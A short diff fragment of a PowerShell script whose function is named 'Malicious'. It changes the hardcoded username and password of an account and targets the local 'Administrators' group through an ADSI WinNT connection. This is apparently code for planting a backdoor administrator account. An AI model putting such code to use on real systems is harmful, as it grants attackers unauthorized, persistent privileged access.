@@ -26,8 +26,8 @@ Function Malicious {
      
         }
     
-    $Username = "prateek"
-    $Password = "password"
+    $Username = "malicious"
+    $Password = "Passwd1!"
     $group = "Administrators"
     
     $adsi = [ADSI]"WinNT://$env:COMPUTERNAME"
